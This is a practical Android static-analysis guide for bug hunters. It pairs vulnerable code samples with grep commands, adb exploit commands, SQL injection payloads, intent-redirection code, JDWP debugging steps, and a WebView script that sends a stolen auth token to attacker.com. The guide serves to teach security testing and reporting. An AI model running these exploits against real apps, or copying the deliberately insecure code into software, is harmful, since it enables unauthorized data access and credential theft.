# Android Static Analysis — PoC Examples & Code Patterns

Each section shows: vulnerable code → grep command to find it → exploit/PoC → what to report.

---

## 1. Exported Activity — Auth Bypass

### Vulnerable Code (`AdminActivity.java`)
```java
// AndroidManifest.xml
<activity android:name=".ui.AdminActivity"
    android:exported="true" />   // ← no permission required

// AdminActivity.java
public class AdminActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No auth check — goes straight to admin UI
        setContentView(R.layout.activity_admin);
        loadAdminDashboard();
    }
}
```

### Find It
```bash
# Step 1: list all exported activities
grep -n 'exported="true"' target_apktool/AndroidManifest.xml | grep -i activity

# Step 2: for each one, check if onCreate does any auth
jadx_file=$(grep -rn 'AdminActivity' target_jadx/sources/ -l)
grep -n 'checkAuth\|isLoggedIn\|getToken\|SharedPreferences\|session' "$jadx_file"
# If nothing matches → no auth check → vulnerable
```

### Exploit
```bash
adb shell am start -n com.target.app/.ui.AdminActivity
# App opens admin panel without login
```

### Report Impact
> Unauthenticated local attacker or malicious app can access admin functionality directly, bypassing login flow.

---

## 2. Exported ContentProvider — Unauthorized Data Access

### Vulnerable Code
```java
// AndroidManifest.xml
<provider
    android:name=".data.UserProvider"
    android:authorities="com.target.app.provider"
    android:exported="true" />   // ← no readPermission / writePermission

// UserProvider.java
public class UserProvider extends ContentProvider {
    @Override
    public Cursor query(Uri uri, ...) {
        SQLiteDatabase db = dbHelper.getReadableDatabase();
        return db.rawQuery("SELECT * FROM users", null);  // ← all users exposed
    }
}
```

### Find It
```bash
# Find exported providers
grep -n -A5 '<provider' target_apktool/AndroidManifest.xml | grep -B3 'exported="true"'

# Check if readPermission / writePermission are missing
grep -n 'readPermission\|writePermission' target_apktool/AndroidManifest.xml

# Find the provider class and check query()
grep -rn 'extends ContentProvider' target_jadx/sources/ -l
```

### Exploit
```bash
# Read all users
adb shell content query --uri content://com.target.app.provider/users

# Try SQL injection in selection arg
adb shell content query --uri content://com.target.app.provider/users \
  --where "1=1 UNION SELECT name,sql,3,4,5 FROM sqlite_master--"

# Insert data
adb shell content insert --uri content://com.target.app.provider/users \
  --bind name:s:attacker --bind email:s:evil@evil.com
```

### Report Impact
> Any installed app can read/modify all user records from the database without any permission.

---

## 3. Hardcoded AWS Key

### Vulnerable Code
```java
// AWSHelper.java
public class AWSHelper {
    private static final String ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";   // ← live key
    private static final String SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";

    public AmazonS3 getS3Client() {
        BasicAWSCredentials creds = new BasicAWSCredentials(ACCESS_KEY, SECRET_KEY);
        return AmazonS3ClientBuilder.standard()
            .withCredentials(new AWSStaticCredentialsProvider(creds))
            .build();
    }
}
```

### Find It
```bash
# Pattern: AKIA prefix = AWS access key
grep -rn 'AKIA[0-9A-Z]{16}' target_jadx/sources/

# Companion secret (40-char base64)
grep -rn -A2 'AKIA[0-9A-Z]{16}' target_jadx/sources/

# Also check strings.xml and raw resources
grep -rn 'AKIA' target_apktool/res/
grep -rn 'AKIA' target_apktool/assets/
```

### Validate (Non-Destructive)
```bash
# Install awscli, configure with found credentials
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# Identity check — confirms key is valid
aws sts get-caller-identity

# List accessible resources (read-only)
aws s3 ls
aws iam list-users 2>/dev/null
```

### Report Impact
> Hardcoded AWS credentials grant [read/write/admin] access to cloud infrastructure. Attacker can exfiltrate S3 data, enumerate IAM users, or escalate privileges.

---

## 4. Firebase Open Database

### Vulnerable Code
```java
// FirebaseConfig.java
FirebaseDatabase database = FirebaseDatabase.getInstance();
DatabaseReference ref = database.getReference("users");
ref.setValue(userData);  // writes user data, no auth token passed

// Firebase rules (misconfigured):
// {
//   "rules": {
//     ".read": true,   // ← anyone can read
//     ".write": true   // ← anyone can write
//   }
// }
```

### Find It
```bash
# Extract project ID / DB URL
grep -rn 'firebaseio\.com\|firebase_database_url\|FIREBASE_URL' \
  target_jadx/sources/ target_apktool/res/ target_apktool/assets/

# google-services.json is goldmine
find target_apktool/ target_jadx/ -name 'google-services.json' -exec cat {} \;
# Look for: "firebase_url", "project_id", "api_key"
```

### Validate
```bash
# Replace with actual project ID
PROJECT="your-project-id"

# Test unauthenticated read
curl -s "https://${PROJECT}-default-rtdb.firebaseio.com/.json?print=pretty" | head -30
# 200 + data = open read (Critical)
# 401 = rules enforced (safe)

# Test write (use a harmless test node, immediately verify then delete)
curl -s -X PUT \
  "https://${PROJECT}-default-rtdb.firebaseio.com/bounty_test_DELETE_ME.json" \
  -d '"test"' -w "\nHTTP %{http_code}\n"
# 200 = open write (Critical)
# Then: immediately clean up
curl -s -X DELETE \
  "https://${PROJECT}-default-rtdb.firebaseio.com/bounty_test_DELETE_ME.json"
```

### Report Impact
> Firebase Realtime Database is accessible without authentication. An unauthenticated attacker can read [user PII/tokens/messages] and write arbitrary data to the database.

---

## 5. SSL — Custom TrustManager Accepts All Certs

### Vulnerable Code
```java
// SSLHelper.java
TrustManager[] trustAllCerts = new TrustManager[]{
    new X509TrustManager() {
        public X509Certificate[] getAcceptedIssuers() { return null; }
        public void checkClientTrusted(X509Certificate[] certs, String authType) {}  // empty
        public void checkServerTrusted(X509Certificate[] certs, String authType) {}  // empty ← VULN
    }
};

SSLContext sc = SSLContext.getInstance("SSL");
sc.init(null, trustAllCerts, new java.security.SecureRandom());
HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

// Also common:
HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true); // ← also vulnerable
```

### Find It
```bash
# Find empty checkServerTrusted
grep -rn -A20 'X509TrustManager\|TrustManager' target_jadx/sources/ | \
  grep -B5 'checkServerTrusted' | head -40

# Faster: look for the "return true" hostname verifier
grep -rn 'return true' target_jadx/sources/ | grep -i 'verify\|hostname'

# OkHttp-specific
grep -rn 'hostnameVerifier\|trustManager\|sslSocketFactory' target_jadx/sources/

# All-accepting HostnameVerifier
grep -rn 'ALLOW_ALL_HOSTNAME_VERIFIER' target_jadx/sources/
```

### Validate (Dynamic — requires a proxy)
```bash
# 1. Install mitmproxy
# 2. Set device proxy to mitmproxy host:8080
# 3. Do NOT install mitmproxy cert (normal cert pinning bypass would need it)
# 4. If the app still connects despite invalid cert → vulnerable

# With Frida (if testing is in scope):
frida -U -f com.target.app -l ssl_bypass.js  # just to confirm, not for report
```

### Report Impact
> The app accepts any TLS certificate, including self-signed or expired ones. An attacker on the same network can perform a man-in-the-middle attack, intercepting and modifying all HTTPS traffic including credentials and session tokens.

---

## 6. WebView — addJavascriptInterface + Untrusted URL

### Vulnerable Code
```java
// BrowserActivity.java
WebView webView = findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new NativeBridge(), "Android");  // ← exposes Java to JS

// NativeBridge.java
public class NativeBridge {
    @JavascriptInterface
    public String getAuthToken() {
        return SharedPrefHelper.getToken();  // ← returns auth token to any JS
    }

    @JavascriptInterface
    public void executeCommand(String cmd) {
        Runtime.getRuntime().exec(cmd);  // ← RCE if reachable
    }
}

// BrowserActivity loading user-controlled URL:
String url = getIntent().getStringExtra("url");  // ← attacker controls this
webView.loadUrl(url);
```

### Find It
```bash
# Find addJavascriptInterface calls
grep -rn 'addJavascriptInterface' target_jadx/sources/ -B5 -A10

# Find @JavascriptInterface annotated methods — what's exposed?
grep -rn '@JavascriptInterface' target_jadx/sources/ -A5 | head -60

# Check if the URL loaded is attacker-controlled
grep -rn 'loadUrl\|loadData' target_jadx/sources/ | head -20
# Then trace where the URL comes from:
grep -rn 'getStringExtra\|getIntent\|getData\(\)' target_jadx/sources/ | \
  grep -i 'url\|uri\|link\|redirect' | head -20
```

### Exploit
```bash
# Via deep link / exported activity
adb shell am start -a android.intent.action.VIEW \
  -d "target://browser?url=https://attacker.com/steal.html" com.target.app

# steal.html:
# <script>
#   var token = Android.getAuthToken();
#   fetch("https://attacker.com/c2?t=" + token);
# </script>

# If the URL is a file:// and universal access is enabled:
adb shell am start -a android.intent.action.VIEW \
  -d "target://browser?url=file:///data/data/com.target.app/shared_prefs/creds.xml"
```

### Find Universal File Access
```bash
grep -rn 'setAllowUniversalAccessFromFileURLs(true)\|setAllowFileAccessFromFileURLs(true)' \
  target_jadx/sources/
# With JS enabled + this = arbitrary file read via XSS
```

### Report Impact
> The WebView loads attacker-controlled URLs with JavaScript enabled and a native bridge exposed. An attacker can steal the auth token, read local files, or achieve remote code execution by luring the user to click a malicious link.

---

## 7. Intent Redirection — Privilege Escalation

### Vulnerable Code
```java
// ProxyActivity.java (exported, anyone can call it)
public class ProxyActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Takes the intent passed to it and forwards it
        Intent forwarded = getIntent().getParcelableExtra("extra_intent");  // ← attacker-controlled
        startActivity(forwarded);  // ← no validation
    }
}
```

### Find It
```bash
# Find activities that extract and re-launch intents
grep -rn 'getParcelableExtra\|getSerializableExtra' target_jadx/sources/ | \
  grep -i 'intent\|activity' | head -20

# Check if the outer activity is exported
grep -rn 'ProxyActivity\|ForwardActivity\|DeepLinkActivity' target_apktool/AndroidManifest.xml
```

### Exploit
```bash
# Attacker app code (conceptual — shows the attack in adb shell form):
# Launch the exported proxy and pass it an intent targeting an internal activity

adb shell am start -n com.target.app/.ui.ProxyActivity \
  --es extra_intent "$(cat <<'EOF'
{
  "component": "com.target.app/.ui.PrivateAdminActivity",
  "extras": {"bypass": "true"}
}
EOF
)"

# Real attack is written in a malicious APK:
Intent inner = new Intent();
inner.setComponent(new ComponentName("com.target.app", "com.target.app.ui.PrivateAdminActivity"));
Intent outer = new Intent();
outer.setComponent(new ComponentName("com.target.app", "com.target.app.ui.ProxyActivity"));
outer.putExtra("extra_intent", inner);
startActivity(outer);
```

### Report Impact
> A malicious app can exploit the exported ProxyActivity to launch internal non-exported activities, bypassing Android's component permission model.

---

## 8. Insecure SharedPreferences — Token Storage

### Vulnerable Code
```java
// LoginActivity.java — after successful login:
SharedPreferences prefs = getSharedPreferences("auth", MODE_PRIVATE);
prefs.edit()
    .putString("access_token", response.getToken())   // ← plaintext in XML file
    .putString("password", password)                  // ← never store plaintext password
    .apply();
```

### Find It
```bash
# Tokens written to SharedPreferences
grep -rn 'putString\|putInt\|putLong' target_jadx/sources/ | \
  grep -i 'token\|password\|secret\|key\|auth\|session\|pin\|credit' | head -20

# Confirm it's not EncryptedSharedPreferences
grep -rn 'EncryptedSharedPreferences\|MasterKey\|androidx\.security' target_jadx/sources/ -l
# If no results → unencrypted storage
```

### Exploit (Dynamic — demonstrates impact)
```bash
# No root required if allowBackup=true (see manifest check)
adb backup -f backup.ab -noapk com.target.app
# Unpack:
( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 backup.ab ) | \
  zcat | tar xvf -

# Or with root:
adb shell run-as com.target.app \
  cat /data/data/com.target.app/shared_prefs/auth.xml

# Output:
# <string name="access_token">eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo...</string>
# <string name="password">MyS3cr3tP4ss!</string>
```

### Report Impact
> Authentication tokens and passwords are stored in plaintext SharedPreferences. A backup extraction (no root required) or physical device access exposes all credentials.

---

## 9. Weak Cryptography — ECB Mode

### Vulnerable Code
```java
// EncryptionHelper.java
public static byte[] encrypt(String data, SecretKey key) throws Exception {
    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");  // ← ECB = no IV, leaks patterns
    cipher.init(Cipher.ENCRYPT_MODE, key);
    return cipher.doFinal(data.getBytes());
}

// Also common: hardcoded key
private static final String KEY = "MyHardcodedKey12";  // ← 16 bytes = AES-128
SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), "AES");
```

### Find It
```bash
# ECB mode
grep -rn '"AES/ECB\|AES"\s*)\|Cipher\.getInstance.*ECB' target_jadx/sources/

# DES (broken)
grep -rn '"DES"\|"DESede"\|"3DES"\|TripleDES' target_jadx/sources/

# Hardcoded key passed to SecretKeySpec
grep -rn 'SecretKeySpec\|new SecretKeySpec' target_jadx/sources/ -B3 | \
  grep -E '"[A-Za-z0-9]{8,}"'

# Static IV (all zeros or hardcoded bytes)
grep -rn 'IvParameterSpec\|ivSpec' target_jadx/sources/ -B5 | \
  grep -E 'new byte\[|0x00|static final'
```

### Demonstrate Impact
```python
# ECB mode leaks repeated blocks — show this in report
from Crypto.Cipher import AES
import os

key = b"MyHardcodedKey12"
# ECB encrypts identical 16-byte blocks identically
msg = b"ATTACK AT DAWN!!ATTACK AT DAWN!!"  # two identical 16-byte blocks
cipher = AES.new(key, AES.MODE_ECB)
ct = cipher.encrypt(msg)
print(ct.hex())
# block1 == block2 in ciphertext → pattern leakage
print(ct[:16].hex() == ct[16:].hex())  # True
```

### Report Impact
> AES-ECB mode reveals plaintext patterns in ciphertext. Identical plaintext blocks produce identical ciphertext blocks, allowing an attacker to deduce information about the plaintext (e.g., repeated fields, known prefixes).

---

## 10. Log Leakage of Sensitive Data

### Vulnerable Code
```java
// NetworkHelper.java
public void login(String email, String password) {
    Log.d("AUTH", "Login attempt: email=" + email + " password=" + password);  // ← VULN
    Log.d("API", "Response token: " + authToken);                               // ← VULN
    // ...
}
```

### Find It
```bash
# Sensitive data in log calls
grep -rn 'Log\.d\|Log\.v\|Log\.i\|Log\.w\|Log\.e\|System\.out\.print\|printStackTrace' \
  target_jadx/sources/ | \
  grep -iE 'password|passwd|token|secret|auth|key|credit|card|ssn|cvv|pin|otp|session' | head -20

# Also check for Timber (popular logging lib)
grep -rn 'Timber\.d\|Timber\.v\|Timber\.i' target_jadx/sources/ | \
  grep -iE 'password|token|secret|auth' | head -10
```

### Validate (Dynamic)
```bash
# Connect device, filter logcat for the app
adb logcat --pid=$(adb shell pidof com.target.app) | \
  grep -iE 'password|token|secret|auth|key|credit'
```

### Report Impact
> Authentication tokens and passwords are written to Android logcat. Any app with READ_LOGS permission (or ADB access) can read these credentials in real time.

---

## 11. Deep Link Parameter Injection → Open Redirect

### Vulnerable Code
```java
// DeepLinkActivity.java
// Manifest: android:scheme="target" android:host="redirect"
public class DeepLinkActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri data = getIntent().getData();
        String url = data.getQueryParameter("url");       // ← user-controlled
        // No validation of url
        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));  // ← open redirect
    }
}
```

### Find It
```bash
# Find deep link intent data handlers
grep -rn 'getIntent\(\)\.getData\(\)\|getScheme\(\)\|getQueryParameter' \
  target_jadx/sources/ -A5 | head -40

# Trace what happens to the extracted param
grep -rn 'getQueryParameter\|getPathSegments\|getFragment' target_jadx/sources/ -A10 | \
  grep -E 'loadUrl|startActivity|Intent.*VIEW|Uri\.parse' | head -20

# Find registered schemes
grep -n 'android:scheme' target_apktool/AndroidManifest.xml
```

### Exploit
```bash
# Open redirect via deep link
adb shell am start -a android.intent.action.VIEW \
  -d "target://redirect?url=https://evil.com"

# If WebView loads it:
adb shell am start -a android.intent.action.VIEW \
  -d "target://redirect?url=javascript:alert(document.cookie)"

# OAuth token theft (if the redirect_uri is validated against the deep link):
adb shell am start -a android.intent.action.VIEW \
  -d "target://redirect?url=https://attacker.com/steal?token=abc"
```

### Report Impact
> The deep link handler passes user-controlled URL parameters to WebView/browser without validation, enabling open redirect that can be used to steal OAuth tokens or redirect users to phishing pages.

---

## 12. Debuggable Production Build

### Vulnerable Code
```xml
<!-- AndroidManifest.xml -->
<application
    android:debuggable="true"   <!-- ← CRITICAL in production -->
    android:label="@string/app_name">
```

### Find It
```bash
grep -n 'debuggable' target_apktool/AndroidManifest.xml
# android:debuggable="true" in a production APK = Critical
```

### Exploit
```bash
# Step 1: find JDWP debuggable process
adb jdwp
# Returns PID of debuggable process

# Step 2: forward to localhost
adb forward tcp:8700 jdwp:<PID>

# Step 3: attach debugger (jdb)
jdb -attach localhost:8700

# Step 4: list threads, call methods, dump heap
> threads
> suspend
> eval com.target.app.BuildConfig.DEBUG
> eval android.os.SystemProperties.get("ro.build.type")
# Can call any method, read any field, modify runtime behavior → RCE context

# Step 5: run-as gives file system access without root
adb shell run-as com.target.app ls /data/data/com.target.app/
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml
```

### Report Impact
> The production APK is built with `android:debuggable="true"`. An attacker with USB access (or ADB over network if enabled) can attach a Java debugger, inspect/modify runtime state, read internal app files, and call arbitrary methods — effectively achieving full app compromise.

---

## 13. SQL Injection in ContentProvider

### Vulnerable Code
```java
// DataProvider.java
@Override
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    SQLiteDatabase db = dbHelper.getReadableDatabase();
    // Directly concatenates caller-supplied selection — no parameterization
    return db.rawQuery("SELECT * FROM products WHERE " + selection, null);  // ← SQLi
}
```

### Find It
```bash
# rawQuery with string concat
grep -rn 'rawQuery\|execSQL\|rawDelete\|rawUpdate' target_jadx/sources/ -A3 | \
  grep -E '\+\s*(selection|where|query|filter|input|id|name)|\.format\(' | head -20

# ContentProvider query method
grep -rn 'public Cursor query' target_jadx/sources/ -A20 | \
  grep 'rawQuery\|execSQL' | head -10
```

### Exploit
```bash
# Basic injection
adb shell content query \
  --uri content://com.target.app.provider/products \
  --where "1=1 UNION SELECT username,password,email,4,5 FROM users--"

# Dump all tables
adb shell content query \
  --uri content://com.target.app.provider/products \
  --where "1=2 UNION SELECT name,sql,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--"
```

### Report Impact
> The ContentProvider passes unsanitized query parameters directly to SQLite. An attacker can perform SQL injection to read any table in the database, including user credentials.

---

## 14. Broadcast Receiver — Spoofed Broadcast

### Vulnerable Code
```java
// AndroidManifest.xml
<receiver android:name=".receivers.PaymentReceiver"
    android:exported="true">           <!-- no android:permission -->
    <intent-filter>
        <action android:name="com.target.app.PAYMENT_COMPLETE" />
    </intent-filter>
</receiver>

// PaymentReceiver.java
public class PaymentReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String orderId = intent.getStringExtra("order_id");
        // Trusts the broadcast — marks order as paid without verifying
        OrderManager.markAsPaid(orderId);  // ← no server-side verification
    }
}
```

### Find It
```bash
# Exported receivers
grep -n -A8 '<receiver' target_apktool/AndroidManifest.xml | grep -B5 'exported="true"'

# Check what the receiver does with received data
grep -rn 'extends BroadcastReceiver' target_jadx/sources/ -l | while read f; do
  echo "=== $f ==="
  grep -n 'getStringExtra\|getIntExtra\|markAsPaid\|grantAccess\|setAdmin' "$f"
done
```

### Exploit
```bash
# Send spoofed broadcast
adb shell am broadcast \
  -a com.target.app.PAYMENT_COMPLETE \
  -n com.target.app/.receivers.PaymentReceiver \
  --es order_id "ORD-12345"
# If the app marks order as paid → free goods / payment bypass
```

### Report Impact
> Any app can send a spoofed PAYMENT_COMPLETE broadcast to the exported PaymentReceiver. The receiver trusts the broadcast without server-side verification, allowing an attacker to mark arbitrary orders as paid.

---

## Full Grep Cheatsheet — Run These on Every APK

```bash
TARGET_SRC="target_jadx/sources"
MANIFEST="target_apktool/AndroidManifest.xml"

echo "[MANIFEST] Exported components"
grep -n 'exported="true"' "$MANIFEST"

echo "[MANIFEST] debuggable"
grep -n 'debuggable="true"' "$MANIFEST"

echo "[MANIFEST] allowBackup"
grep -n 'allowBackup="true"' "$MANIFEST"

echo "[MANIFEST] cleartext traffic"
grep -n 'cleartextTrafficPermitted\|usesCleartextTraffic' "$MANIFEST"

echo "[SECRETS] AWS keys"
grep -rn 'AKIA[0-9A-Z]{16}' "$TARGET_SRC"

echo "[SECRETS] Firebase/Google API keys"
grep -rn 'AIza[0-9A-Za-z_-]{35}' "$TARGET_SRC" target_apktool/

echo "[SECRETS] Stripe live keys"
grep -rn 'sk_live_\|pk_live_' "$TARGET_SRC"

echo "[SECRETS] Hardcoded passwords/tokens"
grep -rn -iE '(password|passwd|secret|api_key|apikey|token|auth)\s*=\s*["\x27][^"\x27]{6,}' \
  "$TARGET_SRC" | grep -v '//.*test'

echo "[NETWORK] TrustManager all-accepting"
grep -rn 'checkServerTrusted' "$TARGET_SRC" -A3 | grep -E '\{\s*\}|\{\s*\}'

echo "[NETWORK] HostnameVerifier all-accepting"
grep -rn 'return true' "$TARGET_SRC" | grep -i 'verify\|hostname'

echo "[NETWORK] HTTP URLs"
grep -rn '"http://' "$TARGET_SRC" | grep -v 'localhost\|127\.'

echo "[STORAGE] Tokens in SharedPreferences"
grep -rn 'putString' "$TARGET_SRC" | grep -iE 'token|password|secret|pin|key'

echo "[STORAGE] External storage"
grep -rn 'getExternalStorage\|/sdcard/' "$TARGET_SRC"

echo "[CRYPTO] ECB mode"
grep -rn 'AES/ECB\|DES[^e]\|MD5\|SHA-1\b' "$TARGET_SRC"

echo "[CRYPTO] Static IV"
grep -rn 'IvParameterSpec' "$TARGET_SRC" -B5 | grep 'static\|final\|0x00\|new byte\[16\]'

echo "[IPC] WebView JS interface"
grep -rn 'addJavascriptInterface\|setJavaScriptEnabled(true)' "$TARGET_SRC"

echo "[IPC] Universal file access"
grep -rn 'setAllowUniversalAccessFromFileURLs(true)' "$TARGET_SRC"

echo "[IPC] Intent redirection"
grep -rn 'getParcelableExtra.*[Ii]ntent\|startActivity.*getExtra' "$TARGET_SRC"

echo "[LOG] Sensitive data in logs"
grep -rn 'Log\.\(d\|v\|i\)' "$TARGET_SRC" | \
  grep -iE 'password|token|secret|auth|key|credit|card'

echo "[SQLI] rawQuery concatenation"
grep -rn 'rawQuery.*+\|execSQL.*+' "$TARGET_SRC"

echo "[BACKUP] Firebase URL"
grep -rn 'firebaseio\.com' "$TARGET_SRC" target_apktool/
```

Save this as `run_checks.sh`, `chmod +x`, run it on every new APK.

---

## Triage Decision Table

| Finding | Auto-exploitable | Report? |
|---|---|---|
| Exported activity, no auth check | Yes — `adb am start` | Yes |
| Open ContentProvider, no permission | Yes — `adb content query` | Yes |
| Hardcoded AWS key, `sts:GetCallerIdentity` works | Yes | Yes |
| Firebase open read with PII | Yes — `curl .json` | Yes |
| Empty `checkServerTrusted` | Needs MitM position | Yes |
| `addJavascriptInterface` + controlled URL | Yes if exported activity | Yes |
| `debuggable=true` | Needs USB/ADB | Yes |
| Token in SharedPreferences | Needs device access or backup | Medium — check allowBackup |
| ECB mode | No direct exploit path alone | Chain with key extraction |
| Log leakage | Needs READ_LOGS or ADB | Medium |
| HTTP endpoints | Needs MitM | Yes if sensitive data |
